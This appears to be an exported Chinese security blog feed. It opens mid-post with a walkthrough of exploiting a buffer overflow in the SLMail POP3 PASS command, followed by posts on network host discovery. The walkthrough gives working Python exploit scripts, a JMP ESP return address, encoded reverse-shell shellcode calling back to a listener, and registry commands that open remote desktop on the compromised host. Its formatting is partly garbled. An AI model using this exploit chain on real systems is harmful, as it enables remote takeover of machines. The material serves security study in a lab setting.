<figure class="highlight plain"><figcaption><span>/usr/share/metasploit-framework/tools/exploit/```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  ```udo ./pattern_create.rb -l 2700``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/17607469.jpg)</span><br><span class="line"></span><br><span class="line">- 将生成的2700字符串替换上个脚本中的2700个A，然后重新测试，得到如下结果：</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/65730627.jpg)</span><br><span class="line"></span><br><span class="line">- EIP中的四个字节的HEX为：39 69 44 38  由于计算机中内存的分配和人的阅读习惯刚好相反 ：38 44 69 39；对应的ASSIC为：8Di9</span><br><span class="line"></span><br><span class="line">- 使用脚本查看着四个字节的偏移量：</span><br><span class="line"></span><br><span class="line">  ```sudo ./pattern_offset.rb -q 39694438``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-21/50197101.jpg)</span><br><span class="line"></span><br><span class="line">- 然后修改前面的脚本，将偏移量2606的字符串设置为A，然后溢出的四个字节设置为B，其余的设置为C，这样确定精确查找是否正确：</span><br><span class="line"></span><br><span class="line">  ```python</span><br><span class="line">  #!/usr/bin/python</span><br><span class="line">  import socket</span><br><span class="line"> </span><br><span class="line">  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">  buffer = &apos;A&apos; * 2606 + &apos;B&apos; * 4 + &apos;C&apos; * 80</span><br><span class="line">  try:</span><br><span class="line">      print &quot;\nSending evil buffer...&quot;</span><br><span class="line">      s.connect((&apos;192.168.111.137&apos;,110))</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;USER test&apos; + &apos;\r\n&apos;)</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">      print &quot;\nDone!&quot;</span><br><span class="line">  except:</span><br><span class="line">      print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
<p><img src="C:\Users\ADMINI~1\AppData\Local\Temp\1521642331693.png" alt="52164233169"></p>
</li>
<li><p>通过查看EIP的数据：42424242 刚好是4个B，证明前面测试出的偏移量2606是正确的。这里就可以确定我们可以利用这里的精确修改EIP中的指定达到利用PASS缓冲区溢出的漏洞。</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>现在已经可以精确修改寄存器中的内容，被修改的寄存器有EIP（重点关注）、EBP、ESP；接下来的思路：将EIP修改为shellcode代码的内存地址，将shellcode写入该地址空间（ESP），程序读取EIP寄存器中的数值，然后跳转到shellcode代码段并执行</p>
<ul>
<li><p>寻找可存放shellcode的内存空间</p>
</li>
<li><p>通过脚本来探测ESP寄存器的大小：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2606</span> + <span class="string">'B'</span> * <span class="number">4</span> + <span class="string">'C'</span> * <span class="number">890</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span>![](http://demos-qq.oss-cn-beijing.aliyuncs.com/<span class="number">18</span><span class="number">-3</span><span class="number">-22</span>/<span class="number">9248235.j</span>pg)</span><br></pre></td></tr></table></figure>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/9248235.jpg" alt></p>
</li>
<li><p>然后查看esp中C的结束地址：（通过计算可以得出esp的空间大小为四百多，可以放下一个shellcode）<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/79008411.jpg" alt></p>
</li>
<li><p>由于不同类型的程序、协议、漏洞、会认为一些字符是坏字符，这些字符有固定用途</p>
<ul>
<li><p>返回地址、shellcode、buffer都不能出现坏字符</p>
</li>
<li><p>null byte (0x00) 空字符、用于终止字符串的拷贝操作</p>
</li>
<li><p>return （0x0D）回车操作，表示POP3 PASS命令输入完成</p>
</li>
<li><p>思路：发送0x00——0xff 256个字符，查找所有坏字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars = (</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0b\x0c\x0d\x0e\x0f\x00"</span></span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10"</span></span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20"</span></span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30"</span></span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\4e\x4f\x40"</span></span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50"</span></span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60"</span></span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70"</span></span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80"</span></span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90"</span></span><br><span class="line"><span class="string">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0"</span></span><br><span class="line"><span class="string">"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0"</span></span><br><span class="line"><span class="string">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0"</span></span><br><span class="line"><span class="string">"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0"</span></span><br><span class="line"><span class="string">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0"</span></span><br><span class="line"><span class="string">"\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0"</span></span><br><span class="line">)</span><br><span class="line">buffer = <span class="string">'A'</span> * <span class="number">2606</span> + <span class="string">'B'</span> * <span class="number">4</span> + badchars</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nSending evil buffer..."</span></span><br><span class="line">    s.connect((<span class="string">'192.168.111.137'</span>,<span class="number">110</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test'</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS '</span> + buffer + <span class="string">'\r\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21611430.jpg" alt></p>
</li>
<li><p>这里我们可以发现ESP寄存器中没有内容了，然后follow in dump 查看具体位置，发现数据一直到0A的时候就异常了，然后修改脚本，删去0A，通过这种方法找到三个坏字符：0A 0D 00</p>
</li>
</ul>
</li>
<li><p>理论上这个时候就可以进行数据的重定项了，将EIP的内容改为ESP的地址，但实际上是ESP的地址是变化的，所以这样就没有办法做重定向，硬编码不可行，这里就需要变通思路：</p>
<ul>
<li><p>在内存中寻找地址固定的系统模块</p>
</li>
<li><p>在模块中寻找JMP ESP（内存地址固定不变）指令的地址跳转，再由该指令间接跳转到ESP，从而执行shellcode</p>
</li>
<li><p>mono.py脚本识别内存模块，搜索return address 是JMP ESP指令的模块</p>
</li>
<li><p>寻找无DEP、ALSR保护的内存地址</p>
</li>
<li><p>内存地址不含坏字符</p>
</li>
<li><p>配置好调试工具，启动mono脚本：<figure class="highlight plain"><figcaption><span>modules```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/86872565.jpg)</span><br><span class="line"></span><br><span class="line">  我们可以发现系统正在运行的模块都出现了，那么如何找到合适的模块呢，先介绍一下上面的参数</span><br><span class="line"></span><br><span class="line">  rebase（操作系统重启以后是否发生变化，如变化，则为true，否则为false）这里寻找false的</span><br><span class="line"></span><br><span class="line">  safeseh aslr nxcompat 是操作系统的安全机制，都选false,true的是带有保护机制的，内存地址都是随机的。</span><br><span class="line"></span><br><span class="line">  OS dll表示每个操作系统都有的这里都选为TRUE</span><br><span class="line"></span><br><span class="line">- 由于计算机内存中存储的是二进制，汇编指令肯定是无法查找的，所以通过工具将汇编指令转换成二进制：</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/17531204.jpg)</span><br><span class="line"></span><br><span class="line">- 然后我们进行jmp esp的查找，由于调试工具数据是十六进制，所以需要以十六进制的形式进行查找：```! mona find -s &quot;\xff\xe4&quot; -m slmfc.dll</span><br></pre></td></tr></table></figure></p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/28063784.jpg" alt></p>
</li>
<li><p>很遗憾，这个模块里面没有，换其他模块，然后就可以找到可利用的：<figure class="highlight plain"><figcaption><span>-s "\xff\xe4" -m slmfc.dll```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/37554586.jpg)</span><br><span class="line"></span><br><span class="line">- 然后我们双击第一个模块，然后以汇编指令显示就会发现FFES: jmp esp</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/52427619.jpg)</span><br><span class="line"></span><br><span class="line">- 在jmp esp指令这里设置断点：（主要是为了利用脚本向跳转的这里发送溢出的代码，验证是否正常可以跳转）</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/8694262.jpg)</span><br><span class="line"></span><br><span class="line">- 然后我们修改前面精确溢出的代码，溢出的四个字节改为这里设置断点的内存地址，也就是jmp esp ，在添加390个C，也就是说：当程序执行到这jmp esp的时候，跳到ESP寄存器，然后将390个C存入ESP中</span><br><span class="line"></span><br><span class="line">  - 首先我们可以看到jmp esp的地址为：5F 4A 35 8F</span><br><span class="line"></span><br><span class="line">    ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/38278009.jpg)</span><br><span class="line"></span><br><span class="line">  - 然后我们在脚本里构造溢出的内容为这个地址，由于计算机读取数据和人读是相反的，所以要将地址反过来构造：</span><br><span class="line"></span><br><span class="line">    ```python</span><br><span class="line">    #!/usr/bin/python</span><br><span class="line">    import socket</span><br><span class="line"> </span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    buffer = &apos;A&apos; * 2606 + &apos;\x8f\x35\x4a\x5f&apos; + &apos;C&apos; * 390</span><br><span class="line">    try:</span><br><span class="line">        print &quot;\nSending evil buffer...&quot;</span><br><span class="line">        s.connect((&apos;192.168.111.137&apos;,110))</span><br><span class="line">        data = s.recv(1024)</span><br><span class="line">        s.send(&apos;USER test&apos; + &apos;\r\n&apos;)</span><br><span class="line">        data = s.recv(1024)</span><br><span class="line">        s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">        print &quot;\nDone!&quot;</span><br><span class="line">    except:</span><br><span class="line">        print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure></p>
<ul>
<li><p>然后发送数据，查看EIP和ESP的内容：（发现确实跳转了，EIP的内容为跳转的地址，存储C也是在ESP中执行了，说明我们可以执行shellcode）</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/73683041.jpg" alt></p>
<p>按F7执行下一步，发现又跳转到EIP：</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21013466.jpg" alt></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>现在解决了ESP的地址跳转问题，我们就可以进一步构造shellcode执行，进行系统的控制：</p>
<ul>
<li><p>生成shellcode</p>
</li>
<li><p>scratch  （可以用这个去自己写）</p>
</li>
<li><p>用msfpayload生成shellcode</p>
<ul>
<li><figure class="highlight plain"><figcaption><span>-l``` 查看所有的payload</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - ```sudo ./msfpayload win32_reverse LHOST=192.168.111.140 LPORT=4444 C```  用反向连接的这个载荷，C表示的是C语言格式，但是生成以后我们发现存在坏字符，所以shellcode不能使用</span><br><span class="line"></span><br><span class="line">  - ```sudo ./msfpayload win32_reverse LHOST=192.168.111.140 LPORT=4444 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;```   这里使用msfemcode对三个字符进行转义，R是保证msfemcode可以使用、</span><br><span class="line"></span><br><span class="line">    ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/15011544.jpg)</span><br><span class="line"></span><br><span class="line">- 将shellcode加入代码中：</span><br><span class="line"></span><br><span class="line">  ```python</span><br><span class="line">  #!/usr/bin/python</span><br><span class="line">  import socket</span><br><span class="line"> </span><br><span class="line">  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">  shellcode = (</span><br><span class="line">  &quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf7\x71\x2c&quot; +</span><br><span class="line">  &quot;\xc1\x83\xeb\xfc\xe2\xf4\x0b\x1b\xc7\x8c\x1f\x88\xd3\x3e\x08\x11&quot; +</span><br><span class="line">  &quot;\xa7\xad\xd3\x55\xa7\x84\xcb\xfa\x50\xc4\x8f\x70\xc3\x4a\xb8\x69&quot; +</span><br><span class="line">  &quot;\xa7\x9e\xd7\x70\xc7\x88\x7c\x45\xa7\xc0\x19\x40\xec\x58\x5b\xf5&quot; +</span><br><span class="line">  &quot;\xec\xb5\xf0\xb0\xe6\xcc\xf6\xb3\xc7\x35\xcc\x25\x08\xe9\x82\x94&quot; +</span><br><span class="line">  &quot;\xa7\x9e\xd3\x70\xc7\xa7\x7c\x7d\x67\x4a\xa8\x6d\x2d\x2a\xf4\x5d&quot; +</span><br><span class="line">  &quot;\xa7\x48\x9b\x55\x30\xa0\x34\x40\xf7\xa5\x7c\x32\x1c\x4a\xb7\x7d&quot; +</span><br><span class="line">  &quot;\xa7\xb1\xeb\xdc\xa7\x81\xff\x2f\x44\x4f\xb9\x7f\xc0\x91\x08\xa7&quot; +</span><br><span class="line">  &quot;\x4a\x92\x91\x19\x1f\xf3\x9f\x06\x5f\xf3\xa8\x25\xd3\x11\x9f\xba&quot; +</span><br><span class="line">  &quot;\xc1\x3d\xcc\x21\xd3\x17\xa8\xf8\xc9\xa7\x76\x9c\x24\xc3\xa2\x1b&quot; +</span><br><span class="line">  &quot;\x2e\x3e\x27\x19\xf5\xc8\x02\xdc\x7b\x3e\x21\x22\x7f\x92\xa4\x32&quot; +</span><br><span class="line">  &quot;\x7f\x82\xa4\x8e\xfc\xa9\x37\xd9\x43\x4d\x91\x19\x3d\x9d\x91\x22&quot; +</span><br><span class="line">  &quot;\xa5\x20\x62\x19\xc0\x38\x5d\x11\x7b\x3e\x21\x1b\x3c\x90\xa2\x8e&quot; +</span><br><span class="line">  &quot;\xfc\xa7\x9d\x15\x4a\xa9\x94\x1c\x46\x91\xae\x58\xe0\x48\x10\x1b&quot; +</span><br><span class="line">  &quot;\x68\x48\x15\x40\xec\x32\x5d\xe4\xa5\x3c\x09\x33\x01\x3f\xb5\x5d&quot; +</span><br><span class="line">  &quot;\xa1\xbb\xcf\xda\x87\x6a\x9f\x03\xd2\x72\xe1\x8e\x59\xe9\x08\xa7&quot; +</span><br><span class="line">  &quot;\x77\x96\xa5\x20\x7d\x90\x9d\x70\x7d\x90\xa2\x20\xd3\x11\x9f\xdc&quot; +</span><br><span class="line">  &quot;\xf5\xc4\x39\x22\xd3\x17\x9d\x8e\xd3\xf6\x08\xa1\x44\x26\x8e\xb7&quot; +</span><br><span class="line">  &quot;\x55\x3e\x82\x75\xd3\x17\x08\x06\xd0\x3e\x27\x19\xdc\x4b\xf3\x2e&quot; +</span><br><span class="line">  &quot;\x7f\x3e\x21\x8e\xfc\xc1&quot;)</span><br><span class="line">  buffer = &apos;A&apos; * 2606 + &apos;\x8f\x35\x4a\x5f&apos; + &apos;\x90&apos; * 8 +shellcode</span><br><span class="line">  try:                </span><br><span class="line">      #\x90表示的是汇编中的nop，就是不执行操作，保证shellcode的可用性，为了防止esp执行的时候把我的shellcode的前面几个字符忽略掉</span><br><span class="line">      print &quot;\nSending evil buffer...&quot;</span><br><span class="line">      s.connect((&apos;192.168.111.137&apos;,110))</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;USER test&apos; + &apos;\r\n&apos;)</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">      print &quot;\nDone!&quot;</span><br><span class="line">  except:</span><br><span class="line">      print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
<li><p>现在我们监听本地的4444端口，等待反向连接</p>
<figure class="highlight plain"><figcaption><span>nc -vlp 4444```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 然后保证SLmail服务正常运行，发送数据，然后缓冲区溢出利用成功，拿到系统权限：</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/34848509.jpg)</span><br><span class="line"></span><br><span class="line">  - 执行系统命令：</span><br><span class="line"></span><br><span class="line">    ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21092299.jpg)</span><br><span class="line"></span><br><span class="line">  - 觉得命令行不舒服：改注册表，然后3389远程连接：</span><br><span class="line"></span><br><span class="line">    - ```tex</span><br><span class="line">      echo Windows Registry Editor Version 5.00&gt;3389.reg</span><br><span class="line">      echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg</span><br><span class="line">      echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;3389.reg</span><br><span class="line">      C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg</span><br><span class="line">      echo [HKEY_LOCAL_MACHINE\SYSTEM Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg</span><br><span class="line">      C:\&gt;echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">      echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">      C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg</span><br><span class="line">      echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg</span><br><span class="line">      echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">      regedit /s 3389.reg</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>rdesktop 192.168.111.137</code>  远程桌面连接。</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-23/7906793.jpg" alt></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>fuzzy</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>fuzzy</tag>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>主动信息收集——三层发现</title>
    <url>/2018/06/05/%E5%9F%BA%E4%BA%8ETCP-IP%E7%9A%84%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0.md/</url>
    <content><![CDATA[<ul>
<li>三层发现的优点<ul>
<li>可路由</li>
<li>速度快</li>
</ul>
</li>
<li>缺点<ul>
<li>速度比二层慢</li>
<li>经常被边界防火墙过滤(还有可能出现宕机状态）</li>
</ul>
</li>
<li>IP、ICMP、TCP协议</li>
</ul>
<ol>
<li><p>ping</p>
<ul>
<li><p>使用ping命令的时候如果可以接发包，使用的是数据包的type8，如果不可以使用的是type0</p>
</li>
<li><p>ping -192.168.0.102 -c 5         在这里linux和Windows的ping包有些不同，使用-c 可以指定发送多少个数据包</p>
</li>
<li><p>进行三层的发现除了进行icmp的探测之外还可以用路由追踪 <figure class="highlight plain"><figcaption><span>使用路由追踪命令可能会被边界路由拦截，但是路由追踪和ping有点不同，它先会将TTL值设置为1，在经过第一跳路由以后减一，这个时候就会发送数据包</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 使用traceroute和ping -R命令有点不同，使用traceroute返回的是较近的网卡，而使用ping -R返回的是较远的网卡</span><br><span class="line"></span><br><span class="line">- ```ping 192.168.1.103 -c 1 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1``` 这样使用管道就可以将存在的ip显示出来</span><br><span class="line"></span><br><span class="line">- 由于ping命令本身不支持一个网段的并发性扫描，所以通过脚本来实现，三层的发现简单bash脚本：</span><br><span class="line"></span><br><span class="line">  ```bash</span><br><span class="line">  #/bin/bash</span><br><span class="line">  if [ &quot;$#&quot; -ne 1 ]; then</span><br><span class="line">      echo &quot;Usage - ./ping.sh [interface]&quot;</span><br><span class="line">      echo &quot;Example - ./ping.sh 192.168.1.0&quot;</span><br><span class="line">      echo &quot;Example will perform an ICMP&quot;</span><br><span class="line">  exit</span><br><span class="line">  fi</span><br><span class="line">      prefix=$(echo $1 | cut -d &apos;.&apos; -f 1-3)</span><br><span class="line">      for addr in $(seq 1 254); do</span><br><span class="line">      ping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1 &gt;&gt; addr.txt</span><br><span class="line">  done</span><br></pre></td></tr></table></figure></p>
</li>
<li><p>除了使用bash调用ping命令之外，还可以使用scopy类似于二层发现时的脚本来进行主机发现，使用scopy的时候一定要设置超时，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage - ./pingr 0/24 ICMP"</span>  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Example - ./pingr 192.168.0.103"</span>  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Example will perform an ICMP scan of the 192.168.0.0/24 range"</span>  </span><br><span class="line">sys.exit()</span><br><span class="line">address = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">prefix = address.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + address.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + address.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">    answer=sr1(IP(dst=prefix+str(addr))/ICMP(),timeout=<span class="number">0.1</span>,verbose=<span class="number">0</span>)     </span><br><span class="line">    <span class="keyword">if</span> answer == <span class="keyword">None</span>:       </span><br><span class="line">        <span class="keyword">pass</span>   </span><br><span class="line">    <span class="keyword">else</span>:   </span><br><span class="line">        <span class="keyword">print</span> prefix+str(addr)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<ul>
<li>使用脚本也可以调用已经存在的IP列表进行扫描，这样将脚本改为加载ip文件，然后调用扫描就可以了</li>
</ul>
<ol start="2">
<li><p>除了使用ping和traceroute之外还可以使用nmap进行三层的发现：</p>
<ul>
<li><figure class="highlight plain"><figcaption><span>192.168.1.103 -sn```  nmap 使用-sn的时候如果是在本网段的网络会发送arp包，如果不是在本网段会发送icmp的数据包，但由于nmap使用了大量不同的技术手段去探测目标，所以还会发送tcp的数据包。</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">3. fping :比ping的命令强大一点</span><br><span class="line"></span><br><span class="line">   - ```fping 192.168.1.103 -c 10</span><br></pre></td></tr></table></figure>
</li>
<li><figure class="highlight plain"><figcaption><span>-g 192.168.1.1 192.168.1.103  -c 10``` fping 与ping命令不同的是将一个ip段进行扫描，也可以使用0/24扫描，只显示ip的话可以使用管道进行分割</span></figcaption><table><tr><td class="code"><pre><span class="line">   - ```fping -f iplist.txt``` 调用ip列表文件</span><br><span class="line"></span><br><span class="line">4. hping :</span><br><span class="line"></span><br><span class="line">   - 能发送几乎任意TCO/IP的数据包，在一定程度上可以进行压力测试</span><br><span class="line"></span><br><span class="line">   - 功能强大，但每次只能扫描一个目标</span><br><span class="line"></span><br><span class="line">   - ```hping3 192.168.1.103 --icmp -c 2``` 也可以进行三层扫描</span><br><span class="line"></span><br><span class="line">   - 也可以使用一行的方式实现一个ip段的扫描，因为显示的内容太多，所以将扫描结果保存到一个TXT文件中</span><br><span class="line"></span><br><span class="line">      ```for addr in $(seq 1 254);do hping3 192.168.1.$addr --icmp -c 1 &gt;&gt; hping.txt &amp; done</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>主动信息收集</title>
    <url>/2018/06/05/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E4%BA%8C%E5%B1%82%E5%8F%91%E7%8E%B0/</url>
    <content><![CDATA[<blockquote>
<p>被动收集的信息可能不是最新的信息，通过主动的手段去发现更精确的信息</p>
</blockquote>
<ul>
<li>直接与目标系统交互通信</li>
<li>无法避免留下访问的痕迹（如果目标系统有完善的系统日志）</li>
<li>使用受控的第三方电脑进行探测<ul>
<li>使用代理或已经被控制的主机</li>
<li>做好本封杀的准备</li>
<li>使用噪声迷惑目标，淹没真实的探测流量</li>
</ul>
</li>
<li>扫描<ul>
<li>发送不同的探测，根据返回结果判断目标状态（ip，端口，服务）</li>
</ul>
</li>
</ul>
<h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><ul>
<li>识别活着的主机<ul>
<li>潜在的被攻击目标</li>
</ul>
</li>
<li>输出一个ip地址列表</li>
<li>2，3，4层发现</li>
</ul>
<h4 id="发现——二层发现"><a href="#发现——二层发现" class="headerlink" title="发现——二层发现"></a>发现——二层发现</h4><ul>
<li>优点：扫描速度快，可靠</li>
<li>缺点：不可路由，只能发现本网段</li>
<li>ARP协议<ul>
<li>抓包</li>
</ul>
</li>
</ul>
<ol>
<li><p>arping:(二层中单个存活主机的探测)</p>
<ul>
